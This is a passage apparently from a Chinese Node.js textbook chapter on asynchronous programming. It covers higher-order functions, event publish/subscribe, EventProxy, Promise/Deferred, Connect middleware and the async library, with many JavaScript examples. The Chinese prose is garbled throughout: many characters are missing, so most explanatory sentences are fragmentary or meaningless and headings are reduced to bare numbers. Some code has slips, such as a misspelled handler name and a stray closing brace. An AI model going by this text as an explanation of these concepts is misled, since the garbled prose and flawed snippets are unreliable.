在开始编程之前，JavaScript今的数深的。在JavaScript中，数（function）作为一，使用上自由，用它，者作为数，者作为可。数的灵活性是JavaScript人的之一，它与的Lisp语言源。JavaScript在生之前，Brendan Eich了Scheme语言（Scheme作为Lisp的生），收了数编程的，数作为一是。
于数编程在年新，前端图书中这部分识，这作补，因为它是JavaScript编程的。
4.1.1
在的语言中，数的数只接本的数是对用，也只是本数对用。下的为的数
function foo(x) { return x; } 
高数是可以数作为数，是数作为的数，下的
function foo(x) { return function () {  return x; }; } 
高数可以数作为入的起小，是对于C/C++语言言，过也可以到相的。对于程序编写，高数的数要灵活多。了的数用外，还了一后续（ContinuationPassingStyle）的接收，一的。后续的程序编写数的务从到了数中
function foo(x, bar) { return bar(x); } 
以上的为，对于相的foo()数，入的bar数不，可以到不的。一个经的是数组的sort()，它是一个实的高数，可以接一个作为数与序
var points = [40, 100, 1, 5, 25, 10]; points.sort(function(a, b) { 
return a - b; }); //[ 1, 5, 10, 25, 40, 100] 
过动sort()的数，可以决定不的序，从这可以高数的灵活性。Node的最本的事可以到，事的是于高数的性的。在自定事实中，过为相事不的数，可以很灵活务。下
var emitter = new events.EventEmitter(); emitter.on('event_foo', function () { // TODO }); 
本书时到事可以分复杂务的解，它实于高数。高数在JavaScript中是，中ECMAScript5中的一些数组（forEach()、map()、reduce()、reduceRight()、filter()、every()、some()）分。
4.1.2
数用是创一个用外一个部分数量已经的数的数的用。这相对为，下我们以实
var toString = Object.prototype.toString; 
var isString = function (obj) { 
return toString.call(obj) == '[object String]'; }; var isFunction = function (obj) { 
return toString.call(obj) == '[object Function]'; }; 
在JavaScript中时，我们会上的定。这不复杂，只有个数的定，是在的问题是我们要复定一些相的数，有多的isXXX()，就会多的余。为了解决复定的问题，我们入一个新数，这个新数可以工一样量创一些的数。在下的中，我们过isType()数定type的，后一个新的数
var isType = function (type) { return function (obj) {  return toString.call(obj) == '[object ' + type + ']'; }; }; 
var isString = isType('String'); var isFunction = isType('Function'); 
可以，入isType()数后，创isString()、isFunction()数就多了。这过定部分数产生一个新的定数的就是数。数应用在编程中也分，Underscore的after()是数应用，定下
_.after = function(times, func) { if (times <= 0) return func(); return function() { 
 if (--times < 1) { return func.apply(this, arguments); } }; }; 
这个数可以入的times数，生一个要用多次才实数的数。
4.2
经的线程在I/O的下，由于I/O用，在应用CPU与I/O。为了编程人的阅读习，I/O了很多年。在新月的技术大前，性能问题在了编程人的前。性能的过多用多线程的解决，是多线程的入在务的也不。从作系统多线程的上下开，到实编程的、问题，开发人的时候也并不。一个解决I/O性能的是过C/C++用作系统接，自己工I/O，这能到很高的性能，是试开发门分高，在务解决问题上，要大的。Node用JavaScript内部，接到务，这是一创新。
4.2.1
Node的最大性过于于事驱动的I/O
，这是它的灵在。I/O可以使CPU与I/O并不相，源到好的用。对于网应用言，并的想大，开的是分。并使个之能有组织起，这也是Node在中广的因，图4-1为I/O用的图。

图4-1 I/O用的图用统的I/O，分中性能的会是的，图4-2。

图4-2 I/O用图
在3中，我们过Node实I/O的。用事环的，JavaScript线程像一
个分务的大管，I/O线程的个I/O线程都是小，分的务，小与管之不，以可以的高。这个用事环的经
在很多都在应用，最的是UI编程，iOS应用开发。这个的在于管过多的性务，多，会到务的，管个不，小不到活，是的。言之，Node是为了解决编程中I/O的性能问题的，用了线程，这Node像一个I/O问题的能，CPU决于管的能。
在1中，从数的测试中可以到，这个管的能。的，C语言是性能至，于V8性能的Node是一高，在的情下（用C/C++），Node的能可以之。
由于事环要应对海量请，海量请时作用在线程上，就要一个过多的CPU时。至于是，还是I/O，只要不I/O的，就不问题。对CPU的用不要过10 ms，者大量的分解为多的小量，过setImmediate()。只要用Node的与V8的高性
能，就可以分发CPUI/O源的优势。

4.2.2
Node编程，这也是编程次大在务。它I/OV8高性能，线程的性能，JavaScript在后端到实用。一，它也统一了前后端JavaScript的编程。对于编程的新与不，开发者们有着不程的。接下，我们一下编程的，以好用Node。
1. 1
过我们时，使用Java的
try/catch/final语，下
try { 
JSON.parse(json); 
} catch (e) { 
// TODO 
} 
是这对于编程言并不一定用。3到过，I/O的实要包个请。这个中有事环的，者不关
。在
一个请后立，因为并不一定发生在这个，try/catch的在不会发作用。的定下
var async = function (callback) { 
process.nextTick(callback); 
}; 
用async()后，callback起，到下一个事环（Tick）才会。试对try/catch作只能次事环内的，对callba
ck时的能为，下
try { async(callback); } catch (e) { // TODO } 
Node在上了一定，作为数的一个实，为，
用没有
async(function (err, results) { // TODO }); 
在我们自编写的上，也要这样一些一用者入的数用者。下
var async = function (callback) { 
process.nextTick(function() {  var results = something;  if (error) { 
return callback(error); }  callback(null, results); 
}); }; 
在的编写中，一个的是对用的数，下
try { req.body = JSON.parse(buf, options.reviver); callback(); 
} catch (err){ err.body = buf; err.status = 400; callback(err); 
} 
上的图是JSON.parse()中可能的，是不小心包了用的数。这着数中有，会入catch()中，于是数会次。这不是的情，可能务。的应为
try { req.body = JSON.parse(buf, options.reviver); } catch (err){ err.body = buf; 
err.status = 400; 
return callback(err); 
} 
callback(); 
在编写时，只要用的可，过多。
2. 2
这是Node人最多的。在前端开发中，DOM事相对言不会在相要多个事一起作的场景，在多的情。下的为立的DOM事定
$(selector).click(function (event) { 
// TODO 
}); 
$(selector).change(function (event) { 
// TODO 
}); 
是对于Node言，事务中在多个用的场景是。一个遍目的作，下
fs.readdir(path.join(__dirname, '..'), function (err, files) { files.forEach(function (filename, index) { fs.readFile(filename, 'utf8', function (err, file) { // TODO }); }); }); 
对于上场景，由于次作在关系，数的为也情有可。，在网页的过程中，要数、、源，这者相之并不，最中者一不可。用认的用，程序也会下
fs.readFile(template_path, 'utf8', function (err, template) { db.query(sql, function (err, data) {  l10n.get(function (err, resources) { // TODO }); }); }); 
这在的上是没有问题的，问题在于这并没有用好I/O的并优势。这是编程的问题，为有人，因为的深，最的从Node中生。是实情没有想，且后解决问题。
3. 3
对于入JavaScript不的开发者，这门编程语言没有sleep()这样的线程能，能用于时作的只有setInterval()setTimeout()这个数。是人的是，这个数并不能后续的续。以，有多的开发者会写下这样的实sleep(1000)的
// TODO 
var start = new Date(); 
while (new Date() - start < 1000) { 
// TODO 
} 
//阻塞的代码
是事实是的，这会续用CPU，与的线程相甚，
了事环的。由于Node线程的因，CPU源都会用于为这服务，余请都会不到应。这样的时，在统一务之后，用setTimeout()的会好。
4. 4
我们在JavaScript的时候，的是一线程上的，这在中的是
JavaScript线程与UI用的一个线程在Node中，只是没有UI的部分，本相。4 对于服务端言，服务是多CPU，个Node程实质上是没有分用多CPU的。着今务的复杂，对于多CPU用的要也高。了WebWorkers，它过JavaScript与UI分，可以很好用多CPU为大量服务。时前端Web Workers也是一个用机使用多CPU的想。图4-3为WebWorkers的工作图。

图4-3 Web Workers的工作图
在于前端在对的后性，Web Workers并没有广应用起。外Web Workers能解决用CPUUI，是不能解决UI的问题。Node了这个，child_process是API，cluster是深次的应用。
WebWorkers的，开发人要多线程的编程，这对于以的JavaScript编程经是的。在9中，我们分Node的程，以开这部分内。
5. 5
习编程的学，也能从对编程的产品，、务分问题。Node了绝大部分的API量的API，的会因为没有API开发者从。目前，Node中试图编程，并不能到生，要者编实。对于用，过好的程，还是能序的。
4.3
前了因编程的一些问题，与编程的性能相，编程过程起没有想中好，是事实也没有。与问题相，解决问题的是多，本开个的解决。
目前，编程的要解决有下3。
事发/阅
。
. Promise/Deferred。

程。
4.3.1/
事是一广用于编程的，是数的事，发/阅。
Node自的events（http://nodejs.org/docs/latest/api/events.html）是发/阅的一个实，Node中部分都继自它，这个前端中的大量DOM事，不在事，也不在preventDefault()、stopPropagation()stopImmediatePropagation()事的。它有addListener/on()、once()、removeListener()、removeAllListeners()emit()本的事的实。事发/阅的作极，下
//订阅

emitter.on("event1", function (message) { 
console.log(message); 
}); 
//发布
emitter.emit('event1', "I am message!"); 
可以到，阅事就是一个高数的应用。事发/阅可以实一个事与多
个数的关，这些数为事。过emit()发事后，会立前事的有。可以很灵活加，使事之可以很关解。
事发/阅自并用的问题，在Node中，emit()用多是事环触发的，以我们事发/阅广应用于编程。

事发/阅用解务，事发者关阅的实务，甚至不用关有多个在，数过的可以很灵活。在一些场景中，可以过事发/阅组，不的部分在组内部，、自定的部分过事外部，这是一的分。在这事发/阅组中，事的要，因为它关外部用组时是否优，从事的就是组的接。
从一个，事也是一（hook）机，用内部数
外部的用者。
Node中的很多对大多有的，能，不过事的，我们就对在的中内部。这过事的，可以使编程者不用关组是动的，只关在要的事上可。下的HTTP请是场景
var options = { host: 'www.google.com', port: 80, path: '/upload', method: 'POST' 
}; 
var req = http.request(options, function (res) { console.log('STATUS: ' + res.statusCode); console.log('HEADERS: ' + JSON.stringify(res.headers)); res.setEncoding('utf8'); res.on('data', function (chunk) { 
 console.log('BODY: ' + chunk); }); res.on('end', function () {
 // TODO 
}); }); req.on('error', function (e) { 
console.log('problem with request: ' + e.message); }); // write data to request body req.write('data\n'); req.write('data\n'); req.end(); 
在这HTTP请的中，程序只要线在error、data、end这些务事上可，至于内部的程，过于关。一的是，Node对事发/阅的机做了一些外的，这大多是于性的。下为个的。
对一个事加了过10个，会到一。这一与Node自线程有关，者认为多可能内，以在这样一。用emitter.setMaxListeners(0)可以这个。一，由于事发会起一系，事相关的过多，可能在过多用CPU的情景。
为了，EventEmitter对对error事了对。的触发了error事，EventEmitter会是否有对error事加过。加了，这个会由，否这个会作为。外部没有这个，会起线程。一个的EventEmitter实应对error事做。
1. events
实一个继EventEmitter的是分的，以下是Node中Stream对继EventEmitter的
var events = require('events'); 
function Stream() { 
events.EventEmitter.call(this); } util.inherits(Stream, events.EventEmitter); 
Node在util中了继的，以可以很用。开发者可以过这样的继EventEmitter，用事机解决务问题。在Node的心中，有数都继自EventEmitter。
2. 
在事阅/发中，也有一个once()，过它加的只能一次，在之后就会它与事的关。这个性可以我们过一些复性的事应。下我们一下用once()解决问题。
在机中，由于在内中，问分，用于加数问，绝大多数的请不复做一些的数读。问题，就是在高问量、大并发量的情下的情景，时大量的请时入数中，数时大的请，前到网的应。
以下是一数语的用
var select = function (callback) { db.select("SQL", function (results) {  callback(results); }); }; 
好动，这时中是不在数的，问量大，一SQL会发到数中反复，会服务的性能。一是加一个，相关下
var status = "ready"; var select = function (callback) { 
if (status === "ready") {  status = "pending";  db.select("SQL", function (results) { 
status = "ready"; callback(results);  }); } }; 
是在这情景下，续多次用select()时，只有一次用是生的，后续的select()是没有数服务的，这个时候可以入事，相关下
var proxy = new events.EventEmitter(); 
var status = "ready"; 
var select = function (callback) { 
proxy.once("selected", callback); 
if (status === "ready") { 
 status = "pending"; 
 db.select("SQL", function (results) { 
proxy.emit("selected", results); 
status = "ready"; 
 }); 
} 
}; 
这我们用了once()，有请的都入事中，用一次就会的，一个只会一次。对于相的SQL语，在一个开始到的过程中只有一次。SQL在时，新到的相用只在中数就可，一，到的可以这些用使用。这能复的数用产生的开。由于Node线程的因，心问题。这实也可以应用到他程用的场景中，使外部没有，也能有复开。
可能因为在过多发的，要用setMaxListeners(0)，者大的。
once()产生的，也可以在的Gearman应用中实。在JavaScript中，实这个分。
3. 
事发/阅有着它的优。用高数的优势，作为数可以加，它开发者时可能加的务。也可以务，务的一。一言，事与的关系是一对多，在编程中，也会事与的关系是多对一的情，也就是一个务可能个过事的。前的过深的因是。
这我们试过生解决2中为了最的可以并用实只能的问题。我们的目是要享I/O的性能，也要好的编。这以页要的读、数读本源读为要一下，相关下
var count = 0; 
var results = {}; 
var done = function (key, value) { 
results[key] = value; 
count++; 
if (count === 3) { 
 //渲染面
 render(results); 
} }; 
fs.readFile(template_path, "utf8", function (err, template) { 
done("template", template); }); db.query(sql, function (err, data) { 
done("data", data); }); l10n.get(function (err, resources) { 
done("resources", resources);  }); 
由于多个场景中数的并不能序，且数之相没有，以要一个数量作的。，我们这个用于测次数的量做。的你也已经想到用数量数的关系了，相关下
var after = function (times, callback) { var count = 0, results = {}; return function (key, value) { 
 results[key] = value;  count++;  if (count === times) { 
callback(results); } }; }; 
var done = after(times, render); 
上实了多对一的目的。务继续，我们可以继续用发/阅多对多的，相关下
var emitter = new events.Emitter(); var done = after(times, render); 
emitter.on("done", done); emitter.on("done", other); 
fs.readFile(template_path, "utf8", function (err, template) { 
emitter.emit("done", "template", template); }); db.query(sql, function (err, data) { 
emitter.emit("done", "data", data); }); l10n.get(function (err, resources) { 
emitter.emit("done", "resources", resources); }); 
这了前者用的数多对一的收事阅/发中一对多的发。在上的中，有一个用者不服的问题，就是用者要这个done()数，以在数中要从中数一个一个，。
一个是自者自己写的EventProxy，它是对事阅/发的，可以自由阅组事。由于用的是事阅/发，与Node分，相关下
var proxy = new EventProxy(); 
proxy.all("template", "data", "resources", function (template, data, resources) { // TODO }); 
fs.readFile(template_path, "utf8", function (err, template) { 
proxy.emit("template", template); }); db.query(sql, function (err, data) { 
proxy.emit("data", data); }); l10n.get(function (err, resources) { 
proxy.emit("resources", resources); }); 
EventProxy了一个all()阅多个事，个事都触发之后，才会。外的一个是tail()，它与all()的区在于all()的在之后只会一次，tail()的在时一次之后，组事中的个事次触发，会用最新的数继续。
all()的一个是在中数的数与阅组事的事是一对应的。
之外，在的场景下，我们要从一个接多次读数，时触发的事是相的。EventProxy了after()实事在多次后的一事组阅，下
var proxy = new EventProxy(); 
proxy.after("data", 10, function (datas) { // TODO }); 
这10次data事后。这个到的数为10次事触发次序序的数组。EventProxy了可以应用于Node中外，还可以用在前端中。
4. EventProxy
EventProxy自于Backbone的事，Backbone的事是Model、View的
能，在前端有广的使用。它在个all事触发时都会触发一次all事，相关下
// Trigger an event, firing all bound callbacks. Callbacks are passed the // same arguments as `trigger` is, apart from the event name. // Listening for `"all"` passes the true event name as the first argument trigger : function(eventName) { 
var list, calls, ev, callback, args; var both = 2; if (!(calls = this._callbacks)) return this; 
while (both--) {  ev = both ? eventName : 'all';  if (list = calls[ev]) { 
for (var i = 0, l = list.length; i < l; i++) { if (!(callback = list[i])) {  list.splice(i, 1); i--; l--; 
} else {  args = both ? Array.prototype.slice.call(arguments, 1) : arguments;  callback[0].apply(callback[1] || this, args); 
} } 
} } return this; 
} 
EventProxy是all做一个事的，在中入一些务一事解决的问题。的还有all()、tail()、after()、not()any()。
5. EventProxy
EventProxy在事发/阅的上还了。在中，要用一定的。在过一时内，我们都是过外加error事统一的，大下
exports.getContent = function (callback) {  var ep = new EventProxy(); 
ep.all('tpl', 'data', function (tpl, data) {  //成功回调 callback(null, { 
template: tpl, data: data 
 }); }); // error事件ep.bind('error', function (err) { 
 //载有处理函数 ep.unbind();  //异常回调 callback(err); 
}); fs.readFile('template.tpl', 'utf-8', function (err, content) { 
 if (err) { //发生异常给error事件的处理函数处理return ep.emit('error', err); 
} 
 ep.emit('tpl', content); }); db.get('some sql', function (err, result) {
 if (err) { //发生异常给error事件的处理函数处理return ep.emit('error', err); 
}  ep.emit('data', result); }); }; 
因为的因，量一下多起了，EventProxy在实践过程中了这个问题，相关下
exports.getContent = function (callback) {  var ep = new EventProxy(); 
ep.all('tpl', 'data', function (tpl, data) {  //成功回调 callback(null, { 
template: tpl, data: data 
 }); }); //定错误处理函数ep.fail(callback); 
fs.readFile('template.tpl', 'utf-8', ep.done('tpl')); db.get('some sql', ep.done('data')); }; 
在上中，EventProxy了fail()done()这个实优，使开发者关在务部分，不是在上。关于fail()的实，可以以下的
ep.fail(callback); 
上这于下的
ep.fail(function (err) { callback(err); }); 
于
ep.bind('error', function (err) { // 载有处理函数ep.unbind(); // 异常回调callback(err); 
}); 
done()的实，也可以下的
ep.done('tpl');
它于
function (err, content) { 
if (err) {  //发生异常给error事件处理函数处理 return ep.emit('error', err); 
} ep.emit('tpl', content); } 
时，done()也接一个数作为数，相关下
ep.done(function (content) { // TODO // 异常ep.emit('tpl', content); 
}); 
这于
function (err, content) { 
if (err) {  //发生异常给error事件的处理函数处理 return ep.emit('error', err); 
} 
(function (content) {  // TODO //异常 ep.emit('tpl', content); 
}(content)); } 
只入一个数时，要工用emit()触发事。一个是时入事数，相关下
ep.done('tpl', function (content) { // content.replace('s', 'S'); // TODO // 关注异常return content; 
}); 
在这下，我们在数中事的触发，只过的数可。的在done()中用作事的数触发。这的fail()done()分Promise中的fail()done()。言，这可以作事发/阅Promise的。这样的了程序的性，时也了量。
4.3.2Promise/Deferred
使用事的时，程要定。是分，也要定，这是由发/阅的机决定的。下为的Ajax用
$.get('/api', { success: onSuccess, error: onError, complete: onComplete 
}); 
在上的用中，目。是否有一用，的是Promise/Deferred。Promise/Deferred在JavaScript中最于Dojo的中，广为自于jQuery1.5本，本几写了Ajax部分，使用Ajax时可以过下的
$.get('/api') .success(onSuccess) .error(onError) .complete(onComplete); 
这使使不用success()、error()，Ajax也会，这样的用入人一些。在始的API中，一个事只能一个，过Deferred对，可以对事加入的务，下
$.get('/api') .success(onSuccess1) .success(onSuccess2); 
Promise/Deferred在2009年时Kris Zyp为一个，发在CommonJS中。着使用Promise/Deferred的应用多，CommonJS目前已经了Promises/A、Promises/B、Promises/D这样的Promise/Deferred，这使作可以以一优的。
的广使用使、，是一深的，就会编程的不，Promise/Deferred在一定程上解了这个问题。这我们着Promises/A以Promise/Deferred。
1. Promises/A 
Promise/Deferred实包部分，PromiseDeferred。这且不者的区是
，Promises/A的为。Promises/A对个作做了这样的定，下。. Promise作只会在3的一、。
. Promise的只会从，不能反。
不能相。. Promise的一，不能。Promise的图图4-4。

图4-4 Promise的图
在API的定上，Promises/A是的。一个Promise对只要then()可。是对于then()，有以下的要。
接、的。在作时，会用对应。
可progress事作为个。
. then()只接function对，余对。
. then()继续Promise对，以实用。then()的定下

then(fulfilledHandler, errorHandler, progressHandler) 
为了Promises/A，这我们试过继Node的events一个的实，相关下
var Promise = function () { 
EventEmitter.call(this); }; util.inherits(Promise, EventEmitter); 
Promise.prototype.then = function (fulfilledHandler, errorHandler, progressHandler) { 
if (typeof fulfilledHandler === 'function') {  //用once()方法证成功回调执行 this.once('success', fulfilledHandler); 
} 
if (typeof errorHandler === 'function') {  //用once()方法证异常回调执行 this.once('error', errorHandler); 
} if (typeof progressHandler === 'function') { 
 this.on('progress', progressHandler); } return this; 
}; 
这到then()做的事情是数起。为了个程，还要触发这些数的，实这些能的对为Deferred，对，下
var Deferred = function () { this.state = 'unfulfilled'; this.promise = new Promise(); 
}; 
Deferred.prototype.resolve = function (obj) { this.state = 'fulfilled'; this.promise.emit('success', obj); 
}; 
Deferred.prototype.reject = function (err) { this.state = 'failed'; this.promise.emit('error', err); 
}; 
Deferred.prototype.progress = function (data) { this.promise.emit('progress', data); }; 
这的之的对应关系图4-5。

图4-5之的对应关系
用Promises/A的，我们可以对一个的应对，相关下
res.setEncoding('utf8'); res.on('data', function (chunk) { 
console.log('BODY: ' + chunk); }); res.on('end', function () { 
// Done }); res.on('error', function (err) { 
// Error }); 
上可以为下的
res.then(function () { // Done }, function (err) { // Error }, function (chunk) { console.log('BODY: ' + chunk); }); 
要实的API，只要一下可，相关下
var promisify = function (res) { var deferred = new Deferred(); var result = ''; res.on('data', function (chunk) { 
 result += chunk; 
 deferred.progress(chunk); }); res.on('end', function () {
 deferred.resolve(result); }); res.on('error', function (err) { 
 deferred.reject(err); }); return deferred.promise; 
}; 
就到了的。这deferred.promise的目的是为了不外部程序用resolve()reject()，内部的为由定者。下为定好Promise后的用
promisify(res).then(function () { // Done }, function (err) { // Error 
}, function (chunk) { // progress console.log('BODY: ' + chunk); 
}); 
这到PromiseDeferred的上。从上的可以，Deferred要是用于内部，用于的Promise作用于外部，过then()外部以加自定。PromiseDeferred的关系图4-6。

图4-6 PromiseDeferred关系图
与事发/阅相，Promise/Deferred的API接都分。从图4-6中也可以，它务中不可的部分在了Deferred中，可的部分了Promise。时问题就了，对于不的场景，都要Deferred部分，后才能到的接。场景不用，的时与的相并不一定。
Promise是高接，事是接。接可以多复杂的场景，高接一定，不，不有接的灵活性，对于解决问题有。Promises/A的在几Promise中相对。
这一下Q。Q是Promises/A的一个实，可以过npm install q使用。它对Node中数的Promise实下
/** 
* 
Creates a Node-style callback that will resolve or reject the deferred 

* 
promise. 

* 
@returns a nodeback  */ 


defer.prototype.makeNodeResolver = function () { 
var self = this; 
return function (error, value) { 
 if (error) { 
self.reject(error);  } else if (arguments.length > 2) { self.resolve(array_slice(arguments, 1));  } else { self.resolve(value); } }; }; 
可以到这是一个高数的使用，makeNodeResolver了一个Node的数。对于fs.readFile()的用，会为下
var readFile = function (file, encoding) { var deferred = Q.defer(); fs.readFile(file, encoding, deferred.makeNodeResolver()); return deferred.promise; 
}; 
定之后的用下
readFile("foo.txt", "utf-8").then(function (data) { // Success case }, function (err) { // Failed case }); 
Promise过用，实了用反用的分以，这使数相对优。
前分了Q对Node的。事实上，编程中要很多的，为了分情，我写了一个memeda用于makeNodeResolver相的事情。在下的用中可以到，分到个数中
var failing = require('memeda').failing; 
fs.readFile(file, encoding, failing(function (err) { // TODO }).passing(function (data) { // TODO })); 
我们可以对Qmemeda做。者相之在于分，使开发者关情。不之在于Q过promise()可以实，以过多次用then()加多
。可以到，Promise要，是强大，很强的入性的数为量，能相对小。
2. Promise
在Promise的中过，要解决的是个作中在的问题。到我们的，我们要多个用时，于EventProxy，这了一个的实，相关下
Deferred.prototype.all = function (promises) { 
var count = promises.length; var that = this; var results = []; promises.forEach(function (promise, i) { 
 promise.then(function (data) { count--; results[i] = data; if (count === 0) { 
that.resolve(results); }  }, function (err) { that.reject(err); 
 }); }); return this.promise; 
}; 
对于多次的读场景，以下的为，all()个的Promise新组一个新的Promise
var promise1 = readFile("foo.txt", "utf-8"); var promise2 = readFile("bar.txt", "utf-8"); var deferred = new Deferred(); deferred.all([promise1, promise2]).then(function (results) { 
// TODO }, function (err) { // TODO }); 
这过all()多个作。只有有作，这个作才，一中一个作，个作就。本的要用于Promise的，在熟上并whenQ。在实的应用中，可以过NPM这个，它们是的Promise的实。
3. Promise
在API的上，Promise始的事触发为优，它的是要为不的场景不的API，没有接的生事灵活。对于经的场景，API的本也并不高，一做。
Promise的实在于对的作。这一个实的，我在自动测试时，要程服务之多次发，这些是序次的。在Node中，网是的，在编程实像他语言的用。由于网都是由前端工程的，用JavaScript编写自动测试可以他们环境的，以不能因为用就Node。解决用问题的也就是用Deferred。
在有一组的API，为了一事情，我们的大下
obj.api1(function (value1) { obj.api2(value1, function (value2) {  obj.api3(value2, function (value3) { obj.api4(value3, function (value4) { 
callback(value4); });  }); }); }); 
由于有个次的，以。样我们会到的，过10个续就会分。于是我们到了Pyramid ofDoom，为中，是。相信初入Node的人，也写过不。
下我们过的数上的试开
var handler1 = function (value1) { 
obj.api2(value1, handler2); }; var handler2 = function (value2) { 
obj.api3(value2, handler3); }; var handler3 = function (value3) { 
obj.api4(value3, hander4); }; var handler4 = function (value4) { 
callback(value4); }); 
obj.api1(handler1); 
对于喜欢用事的开发者，我们开后的会是样的情下
var emitter = new event.Emitter(); 
emitter.on("step1", function () { obj.api1(function (value1) { emitter.emit("step2", value1); }); }); 
emitter.on("step2", function (value1) { obj.api2(value1, function (value2) {  emitter.emit("step3", value2); }); }); 
emitter.on("step3", function (value2) { obj.api3(value2, function (value3) {  emitter.emit("step4", value3); }); }); 
emitter.on("step4", function (value3) { obj.api4(value3, function (value4) {  callback(value4); }); }); 
emitter.emit("step1"); 
用事开后的了。与相，量加了，这不会好的编程。为，我们要一好的。
的Promise 
想的编程应是前一个的用作为下一个用的开始，是中的用，相关下
promise() .then(obj.api1) .then(obj.api2) .then(obj.api3) .then(obj.api4) .then(function (value4) { 
 // Do something with value4 }, function (error) { 
 // Handle any error from step1 through step4 }) .done(); 
试一下以实用，下
var Deferred = function () { this.promise = new Promise(); }; 
//成态
Deferred.prototype.resolve = function (obj) { var promise = this.promise; var handler; while ((handler = promise.queue.shift())) {
 if (handler && handler.fulfilled) { var ret = handler.fulfilled(obj); if (ret && ret.isPromise) { 
ret.queue = promise.queue; this.promise = ret; return; 
} } } }; 
//态
Deferred.prototype.reject = function (err) { var promise = this.promise; var handler; while ((handler = promise.queue.shift())) {
 if (handler && handler.error) { var ret = handler.error(err); if (ret && ret.isPromise) { 
ret.queue = promise.queue; this.promise = ret; 
4.3  91  
return;  
}  
}  
}  
};  
//生成回调函数 
Deferred.prototype.callback = function () {  
var that = this;  
return function (err, file) {  
 if (err) {  
return that.reject(err); 
 }  
 that.resolve(file);  
};  
};  
4  
var Promise = function () {  
// 队列用存执行的回调函数 
this.queue = [];  
this.isPromise = true;  
};  
Promise.prototype.then = function (fulfilledHandler, errorHandler, progressHandler) {  
var handler = {};  
if (typeof fulfilledHandler === 'function') {  
 handler.fulfilled = fulfilledHandler;  
}  
if (typeof errorHandler === 'function') {  
 handler.error = errorHandler;  
}  
this.queue.push(handler);  
return this;  
};  
这我们以次读作为，以的可性。这读个 是 
于一个 中的内的，相关下 
var readFile1 = function (file, encoding) {  
var deferred = new Deferred();  
fs.readFile(file, encoding, deferred.callback());  
return deferred.promise;  
};  
var readFile2 = function (file, encoding) {  
var deferred = new Deferred();  
fs.readFile(file, encoding, deferred.callback());  
return deferred.promise;  
};  
readFile1('file1.txt', 'utf8').then(function (file1) {  
return readFile2(file1.trim(), 'utf8');  
}).then(function (file2) {  
console.log(file2);  
});  

这为sequence.js。，会到以下的
$ node sequence.js I am file2 
要Promise，要过以下个。(1) 有的都到中。
(2) Promise时，个，一测到了新的Promise对，，后
前Deferred对的promise用为新的Promise对，并中余下的它。写到这，你是否了优次，这的要用于研Promise的实。在多的优，Q者
whenPromise做好，实应用时请用这些熟。. API Promise这会发，为了好的API，要做多的工作。这了一个可以
量Promise，相关下
// smooth(fs.readFile); var smooth = function (method) { 
return function () {  var deferred = new Deferred();  var args = Array.prototype.slice.call(arguments, 1);  args.push(deferred.callback());  method.apply(null, args); return deferred.promise; 
}; }; 
于是前的次读的
var readFile1 = function (file, encoding) { var deferred = new Deferred(); fs.readFile(file, encoding, deferred.callback()); return deferred.promise; 
}; 
var readFile2 = function (file, encoding) { var deferred = new Deferred(); fs.readFile(file, encoding, deferred.callback()); return deferred.promise; 
}; 
可以为
var readFile = smooth(fs.readFile); 
要实样的，量会到
var readFile = smooth(fs.readFile); readFile('file1.txt', 'utf8').then(function (file1) { return readFile(file1.trim(), 'utf8'); }).then(function (file2) { 
// file2 => I am file2 console.log(file2); }); 
4.3.3
前了最为的事发/阅Promise/Deferred，这些是经的者是写的解决，一者，就要为它们做多的工作。这一会一些的应用，，灵活。
1. Next 
了事Promise外，还有一是要工用才能续后续用的，我们做触发，的关是next。事实上，触发目前应用最多的是Connect的中。
这我们且不关Connect的应用，一下Connect的API，相关下
var app = connect(); // Middleware app.use(connect.staticCache()); app.use(connect.static(__dirname + '/public')); app.use(connect.cookieParser()); app.use(connect.session()); app.use(connect.query()); app.use(connect.bodyParser()); app.use(connect.csrf()); app.listen(3001); 
在过use()好一系中后，端上的请。中用了触发的机，最的中下
function (req, res, next) { // 中间件} 
个中请对、应对触发数，过一个，图4-7。

图4-7中过一个
中机使在网请时，可以像编程一样过、、能，不与务产生关，以产生。
下我们Connect的心实，相关下
function createServer() { function app(req, res){ app.handle(req, res); } utils.merge(app, proto); utils.merge(app, EventEmitter.prototype); app.route = '/'; app.stack = []; for (var i = 0; i < arguments.length; ++i) { 
 app.use(arguments[i]); } return app; 
}; 
这过下创了HTTP服务的request事数
function app(req, res){ app.handle(req, res); } 
的心是app.stack = [];这。stack性是这个服务内部的中。
过用use()我们可以中中。下的为use()的要部分
app.use = function(route, fn){ // some code this.stack.push({ route: route, handle: fn }); 
return this; }; 
时就好了。接下，Node生http实可。数的实下
app.listen = function(){ var server = http.createServer(this); return server.listen.apply(server, arguments); 
}; 
最到app.handle()，一个到的网请都从这开始。的下
app.handle = function(req, res, out) { // some code next(); 
}; 
始的next()为复杂，下是后的内，分，中的中并，时入前以实用，到续触发的目的
function next(err) { // some code // next callback layer = stack[index++]; 
layer.handle(req, res, next); } 
有编程复杂的开发者可以Connect的，这对于分务、有。
的是，管中这触发并不要个中都是的，是个都用，实上只是的，没办过并的用务的
。可以一些的，是并还是要事者Promise的，这样务在都能自。
在Connect中，触发分网请的场景。复杂的解为、一的，次请对应对。
2. async 
接下，我们要最的程async。asyncNPM的前，可在Node开发中，程是开发过程中的本。async了20多个用于的作，这我们几用。
的
这我们用前读个的，一下async是解决问题的。async了series()实一组务的，下
async.series([ function (callback) { 
 fs.readFile('file1.txt', 'utf-8', callback); }, function (callback) { 
 fs.readFile('file2.txt', 'utf-8', callback); } ], function (err, results) { // results => [file1.txt, file2.txt] }); 
这于
fs.readFile('file1.txt', 'utf-8', function (err, content) { if (err) { 
 return callback(err); } fs.readFile('file2.txt ', 'utf-8', function (err, data) {
 if (err) { 
return callback(err); }  callback(null, [content, data]); 
}); }); 
这的是数。可以发，series()中入的数callback()并由使用者定。事实上，的数由async过高数的入，这了的。个callback()时会起，后下一个用，到有用。最的数时，的用的以数组的入。这的是一，就有用，并最数的一个数。
的
我们要过并性能时，async了parallel()，用以并一些作。以下为读个的并本
async.parallel([ function (callback) { 
 fs.readFile('file1.txt', 'utf-8', callback); }, function (callback) { 
 fs.readFile('file2.txt', 'utf-8', callback); } ], function (err, results) { // results => [file1.txt, file2.txt] }); 
上这于下的
var counter = 2; var results = []; var done = function (index, value) { 
results[index] = value; counter--; if (counter === 0) { 
 callback(null, results); } }; 
//传递异常var hasErr = false; var fail = function (err) { 
if (!hasErr) {  hasErr = true;  callback(err); 
} }; 
fs.readFile('file1.txt', 'utf-8', function (err, content) { if (err) { 
 return fail(err); } done(0, content); 
}); fs.readFile('file2.txt', 'utf-8', function (err, data) { if (err) { 
 return fail(err); } done(1, data); 
}); 
